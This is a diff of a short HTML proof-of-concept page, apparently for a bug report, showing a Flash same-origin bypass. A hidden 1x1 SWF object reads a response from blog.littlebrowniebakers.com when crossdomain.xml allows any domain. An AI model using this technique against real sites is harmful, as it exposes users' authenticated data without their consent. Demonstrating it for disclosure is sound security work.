@@ -1,15 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Flash SOP Bypass PoC</title>
+  <meta charset="UTF-8">
+  <title>Flash SOP Bypass PoC</title>
 </head>
 <body>
-    <h2>PoC: Reading from blog.littlebrowniebakers.com via Flash</h2>
-    <object width="1" height="1"
-        type="application/x-shockwave-flash"
-        data="flash_requester.swf">
-        <param name="FlashVars" value="url=https://blog.littlebrowniebakers.com/robots.txt" />
-    </object>
-    <p>If the crossdomain.xml policy allows <code>*</code>, the response will be accessible to this SWF file.</p>
+  <h1>🔓 Flash SOP Bypass Proof of Concept</h1>
+
+  <p>
+    This PoC demonstrates how a malicious domain can use a Flash SWF file
+    to make authenticated requests to:
+    <strong>https://blog.littlebrowniebakers.com</strong>
+  </p>
+
+  <p>
+    If the target domain exposes a <code>crossdomain.xml</code> file with:
+  </p>
+
+  <pre><code>&lt;allow-access-from domain="*" /&gt;</code></pre>
+
+  <p>
+    Then the response from authenticated endpoints will be accessible to this SWF file below:
+  </p>
+
+  <object width="1" height="1"
+          type="application/x-shockwave-flash"
+          data="flash_requester.swf">
+    <param name="FlashVars" value="url=https://blog.littlebrowniebakers.com/robots.txt" />
+  </object>
+
+  <p style="color: gray;">
+    Note: The request is being made silently. If Flash is enabled and policy is open, it will succeed.
+  </p>
 </body>
 </html>
